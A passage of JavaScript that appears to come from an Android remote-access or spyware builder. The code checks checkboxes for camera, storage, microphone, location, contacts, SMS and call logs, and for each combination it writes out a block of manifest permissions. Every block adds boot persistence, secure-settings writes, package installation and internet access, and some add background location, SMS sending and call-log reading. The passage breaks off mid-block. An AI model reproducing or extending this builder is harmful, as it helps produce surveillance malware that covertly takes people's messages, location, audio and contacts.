        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>            
   `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>           
   ` 
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        
   ` 
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>       
   ` 
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>` 
        }        

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>`       
        }        
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>   
           ` 
        }  
        //if six checked
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>  
           ` 
        }  
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>`            
        }  
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>          `  }  
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }  
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
        //if two are checked 
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>        ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>        ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>        ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>        ` 
        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>        ` 
        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>        ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>        ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>        ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>        ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>        ` 
        }


          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
